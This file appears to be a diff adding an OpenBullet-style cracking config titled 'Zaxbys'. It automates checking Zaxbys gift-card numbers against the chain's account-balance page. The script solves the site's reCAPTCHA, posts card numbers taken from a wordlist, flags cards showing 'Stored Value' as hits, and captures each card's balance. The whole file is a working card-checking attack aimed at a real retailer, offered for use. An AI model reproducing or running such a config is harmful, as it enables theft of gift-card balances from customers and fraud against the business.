@@ -1,0 +1,52 @@
+[SETTINGS]
+{
+  "Name": "Zaxbys",
+  "SuggestedBots": 1,
+  "LastModified": "2018-09-12T12:02:24.6499246+02:00",
+  "AdditionalInfo": "",
+  "Author": "v0ilawes",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+RECAPTCHA "https://zaxbys.myguestaccount.com/guest/nologin/account-balance" "6LdndBYUAAAAAIE_sQA2y29GSRaKJHKx2DodPT6m" -> VAR "captcha" 
+REQUEST GET "https://zaxbys.myguestaccount.com/guest/nologin/account-balance" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "type=\"hidden\" name=\"" "\"" Recursive=FALSE -> VAR "true" "" "" 
+PARSE "<SOURCE>" LR "nologinCardnumberSubmitButton\" name=\"" "\"" Recursive=FALSE -> VAR "submit" "" "" 
+REQUEST POST "https://zaxbys.myguestaccount.com/guest/nologin/account-balance" AutoRedirect=TRUE 
+  CONTENT "<true>=true&cardnum=<USER>&g-recaptcha-response=<captcha>&<submit>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Host: zaxbys.myguestaccount.com" 
+  HEADER "Origin: https://zaxbys.myguestaccount.com" 
+  HEADER "Referer: https://zaxbys.myguestaccount.com/guest/nologin/account-balance" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "Stored Value" 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" DoesNotContain "Stored Value" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "$0.00" 
+PARSE "<SOURCE>" LR "<div class=\"col-md-2\">$" "</div>" Recursive=FALSE -> CAP "Balance" "" "" 
